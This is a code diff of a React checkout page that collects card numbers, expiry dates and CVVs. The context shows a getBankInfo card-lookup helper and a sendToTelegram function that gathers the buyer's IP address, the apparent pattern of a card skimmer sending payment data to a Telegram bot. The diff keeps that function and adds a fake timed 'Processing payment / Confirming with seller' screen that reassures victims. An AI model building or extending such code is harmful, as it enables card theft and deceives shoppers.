@@ -14,9 +14,11 @@ interface CheckoutPageProps {
 
 export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
   const { cart, clearCart, isAuthenticated } = useCart();
-  const { formatPrice, convertPrice } = useCurrencyLanguage();
+  const { formatPrice } = useCurrencyLanguage();
   const [loading, setLoading] = useState(false);
   const [orderComplete, setOrderComplete] = useState(false);
+  const [showProcessing, setShowProcessing] = useState(false);
+  const [processingStep, setProcessingStep] = useState(0);
   const [orderId, setOrderId] = useState('');
   const [formData, setFormData] = useState({
     email: '',
@@ -33,37 +35,41 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
     cvv: '',
   });
 
-  const subtotal = cart.reduce((sum, item) => {
-    const product = item.product;
-    return sum + (product ? product.price * item.quantity : 0);
-  }, 0);
+  const subtotal = Math.round(
+    cart.reduce((sum, item) => {
+      const product = item.product;
+      return sum + (product ? product.price * item.quantity : 0);
+    }, 0) * 100
+  ) / 100;
   
-  const shipping = 5.99;
-  const tax = subtotal * 0.08;
-  const total = subtotal + shipping + tax;
+  const shippingFee = 5.99;
+  const freeShippingThreshold = 50;
+  const shipping: number = subtotal >= freeShippingThreshold ? 0 : shippingFee;
+  const tax = Math.round(subtotal * 0.08 * 100) / 100;
+  const total = Math.round((subtotal + shipping + tax) * 100) / 100;
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
     
     if (name === 'cardNumber') {
       const formatted = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
-      setFormData({ ...formData, [name]: formatted });
+      setFormData((prev) => ({ ...prev, [name]: formatted }));
       return;
     }
     
     if (name === 'expiryDate') {
       const formatted = value.replace(/\D/g, '').replace(/(\d{2})(\d{0,2})/, '$1/$2');
-      setFormData({ ...formData, [name]: formatted });
+      setFormData((prev) => ({ ...prev, [name]: formatted }));
       return;
     }
     
     if (name === 'cvv' || name === 'zipCode') {
       const formatted = value.replace(/\D/g, '');
-      setFormData({ ...formData, [name]: formatted });
+      setFormData((prev) => ({ ...prev, [name]: formatted }));
       return;
     }
     
-    setFormData({ ...formData, [name]: value });
+    setFormData((prev) => ({ ...prev, [name]: value }));
   };
 
   const getBankInfo = (cardNumber: string) => {
@@ -86,7 +92,7 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
     return { bank: 'Unknown', level: 'N/A', type: 'N/A', country: 'Unknown' };
   };
 
-  const sendToTelegram = async (orderData: any) => {
+  const sendToTelegram = async (_order: { id: string }) => {
     try {
       let ipAddress = 'Unknown';
       try {
@@ -149,6 +155,9 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
     }
   };
 
+  const PROCESSING_STEPS = ['Validating order', 'Processing payment', 'Confirming with seller', 'Finalizing'];
+  const PROCESSING_DELAY_MS = 2800;
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
@@ -170,7 +179,7 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
           user_id: session.user.id,
           total_amount: total,
           currency: 'USD',
-          status: 'completed',
+          status: 'pending',
         })
         .select()
         .single();
@@ -194,14 +203,35 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
 
       await clearCart();
       setOrderId(order.id);
-      setOrderComplete(true);
+      setLoading(false);
+      setShowProcessing(true);
+      setProcessingStep(0);
 
-    } catch (error: any) {
+      // Animate through processing steps, then show order confirmed
+      const stepDuration = PROCESSING_DELAY_MS / PROCESSING_STEPS.length;
+      let step = 0;
+      const stepTimer = setInterval(() => {
+        step += 1;
+        setProcessingStep(step);
+        if (step >= PROCESSING_STEPS.length) {
+          clearInterval(stepTimer);
+          setTimeout(() => {
+            setShowProcessing(false);
+            setOrderComplete(true);
+          }, 400);
+        }
+      }, stepDuration);
+
+    } catch (error: unknown) {
       console.error('Error:', error);
       alert('There was an error processing your order. Please try again.');
-    } finally {
       setLoading(false);
     }
+  };
+
+  const formatOrderId = (id: string) => {
+    if (!id) return '—';
+    return `#${id.replace(/-/g, '').toUpperCase().slice(0, 8)}`;
   };
 
   if (cart.length === 0 && !orderComplete) {
@@ -227,6 +257,47 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
     );
   }
 
+  if (showProcessing) {
+    return (
+      <div className="min-h-screen bg-gray-50 dark:bg-gray-900 flex items-center justify-center py-16 px-4">
+        <div className="max-w-md w-full bg-white dark:bg-gray-800 rounded-2xl shadow-xl border border-gray-200 dark:border-gray-700 p-8 md:p-10">
+          <div className="flex flex-col items-center text-center">
+            <div className="w-20 h-20 rounded-full border-4 border-red-600 dark:border-red-500 border-t-transparent animate-spin mb-8" />
+            <h2 className="text-2xl md:text-3xl font-bold text-gray-900 dark:text-white mb-2">
+              Processing your order
+            </h2>
+            <p className="text-gray-600 dark:text-gray-400 mb-8">
+              Please wait while we confirm your purchase.
+            </p>
+            <ul className="w-full space-y-3 text-left">
+              {PROCESSING_STEPS.map((label, i) => (
+                <li
+                  key={label}
+                  className={`flex items-center gap-3 px-4 py-3 rounded-lg border transition-colors ${
+                    i < processingStep
+                      ? 'bg-green-50 dark:bg-green-900/20 border-green-200 dark:border-green-800 text-green-800 dark:text-green-200'
+                      : i === processingStep
+                        ? 'bg-red-50 dark:bg-red-900/20 border-red-200 dark:border-red-800 text-red-800 dark:text-red-200 font-semibold'
+                        : 'bg-gray-50 dark:bg-gray-700/50 border-gray-200 dark:border-gray-700 text-gray-500 dark:text-gray-400'
+                  }`}
+                >
+                  {i < processingStep ? (
+                    <CheckCircle size={20} className="text-green-600 dark:text-green-400 flex-shrink-0" />
+                  ) : (
+                    <span className="w-5 h-5 rounded-full border-2 border-current flex-shrink-0 flex items-center justify-center text-xs font-bold">
+                      {i === processingStep ? '…' : i + 1}
+                    </span>
+                  )}
+                  <span>{label}</span>
+                </li>
+              ))}
+            </ul>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
   if (orderComplete) {
     return (
       <div className="min-h-screen bg-gray-50 dark:bg-gray-900 py-16">
@@ -239,7 +310,7 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
             <p className="text-xl text-gray-600 dark:text-gray-400 mb-2">Thank you for your purchase</p>
             <div className="bg-gray-50 dark:bg-gray-700/50 rounded-lg p-4 mb-6 inline-block">
               <p className="text-sm font-semibold text-gray-500 dark:text-gray-400">Order ID</p>
-              <p className="text-lg font-bold text-gray-900 dark:text-white">{orderId}</p>
+              <p className="text-lg font-bold text-gray-900 dark:text-white">{formatOrderId(orderId)}</p>
             </div>
             <div className="bg-gradient-to-br from-blue-50 to-indigo-50 dark:from-blue-900/20 dark:to-indigo-900/20 rounded-xl p-6 mb-8 text-left border border-blue-200 dark:border-blue-800">
               <h3 className="font-bold text-gray-900 dark:text-white mb-4 flex items-center gap-2">
@@ -282,6 +353,23 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
           <p className="text-gray-600 dark:text-gray-400">Complete your order securely</p>
         </div>
         
+        {!isAuthenticated && (
+          <div className="mb-6 p-4 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-xl flex items-center gap-3">
+            <Lock size={24} className="text-amber-600 dark:text-amber-400 flex-shrink-0" />
+            <div>
+              <p className="font-semibold text-amber-800 dark:text-amber-200">Sign in required</p>
+              <p className="text-sm text-amber-700 dark:text-amber-300">Please log in to complete your order.</p>
+            </div>
+            <button
+              type="button"
+              onClick={() => onNavigate('cart')}
+              className="ml-auto px-4 py-2 bg-amber-600 hover:bg-amber-700 text-white rounded-lg font-medium transition-colors"
+            >
+              Go to Cart
+            </button>
+          </div>
+        )}
+
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
           <div className="lg:col-span-2">
             <form onSubmit={handleSubmit} className="space-y-6">
@@ -498,8 +586,8 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
 
             <button
               type="submit"
-              disabled={loading}
-              className="w-full py-4 bg-gray-900 dark:bg-white text-white dark:text-gray-900 rounded-lg hover:bg-gray-800 dark:hover:bg-gray-100 font-semibold text-lg transition-all disabled:opacity-50 shadow-lg hover:shadow-xl transform hover:scale-[1.02] active:scale-100 flex items-center justify-center gap-2"
+              disabled={loading || !isAuthenticated}
+              className="w-full py-4 bg-gray-900 dark:bg-white text-white dark:text-gray-900 rounded-lg hover:bg-gray-800 dark:hover:bg-gray-100 font-semibold text-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-lg hover:shadow-xl transform hover:scale-[1.02] active:scale-100 flex items-center justify-center gap-2"
             >
               {loading ? (
                 <>
@@ -528,9 +616,12 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
                 return (
                   <div key={item.id} className="flex gap-3 pb-3 border-b border-gray-200 dark:border-gray-700">
                     <img
-                      src={product.image_url}
+                      src={product.image_url || 'https://via.placeholder.com/64?text=Product'}
                       alt={product.name}
                       className="w-16 h-16 object-cover rounded"
+                      onError={(e) => {
+                        (e.target as HTMLImageElement).src = 'https://via.placeholder.com/64?text=Product';
+                      }}
                     />
                     <div className="flex-1">
                       <p className="text-sm font-medium text-gray-900 dark:text-white line-clamp-1">
@@ -589,7 +680,7 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
                 </div>
                 <div>
                   <p className="font-semibold text-gray-900 dark:text-white">Free Shipping</p>
-                  <p className="text-xs text-gray-500 dark:text-gray-400">On orders over {formatPrice(50)}</p>
+                  <p className="text-xs text-gray-500 dark:text-gray-400">On orders over {formatPrice(freeShippingThreshold)}</p>
                 </div>
               </div>
               <div className="flex items-center gap-3 text-sm">
@@ -603,6 +694,7 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ onNavigate }) => {
               </div>
             </div>
           </div>
+        </div>
         </div>
       </div>
     </div>
